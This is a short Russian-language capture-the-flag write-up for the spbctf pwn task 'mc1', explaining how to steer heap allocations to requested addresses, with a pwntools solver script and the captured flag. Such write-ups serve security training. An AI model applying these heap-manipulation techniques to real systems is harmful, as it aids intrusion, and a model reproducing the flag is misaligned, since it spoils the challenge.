[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn8_mc1)
Описание:
Numbers and Strs. Completely interchangeable.
`nc 109.233.56.90 11725`
**[mc1.elf](https://pwn.spbctf.ru/files/uaf/mc1/mc1.elf)**  
**[mc1.c](https://pwn.spbctf.ru/files/uaf/mc1/mc1.c)**

Программе требует число - количество байт, которые выделятся в куче.
![{A056607D-4874-493B-9970-C77B4A51F358}](../../../../z.%20Images/{A056607D-4874-493B-9970-C77B4A51F358}.png)
Необходимо чтобы следующий участок памяти выделился по адресу, который запросила программа.

Первый участок памяти выделяет по 0x10 байт:
![{01F61B7D-5F5F-4318-AAE4-A4E4BD4C1296}](../../../../z.%20Images/{01F61B7D-5F5F-4318-AAE4-A4E4BD4C1296}.png)
Мой malloc займёт input + 0x10 (заголовок). Следующий начнётся после моего + 0x10 (заголовок). Поэтому надо просто отнимать дополнительно 0x30.

Солвер:
``` python
io = start()

io.recvuntil(b'returned ')
addr = int(io.recvline().decode(), 16)

for _ in range(10):
	io.recvuntil(b'return ')
	need_addr = int(io.recvuntil(b'.').decode()[:-1], 16)
	
	malloc = need_addr - addr - 0x30
	addr = need_addr
	io.sendline(str(malloc).encode())

io.interactive()
```

Запуск:
![{ECBA3ACB-C10E-4C88-B2BC-F8B473BB6875}](../../../../z.%20Images/{ECBA3ACB-C10E-4C88-B2BC-F8B473BB6875}.png)

Ответ: `spbctf{524516ab260d675d23c54408f18845ff}`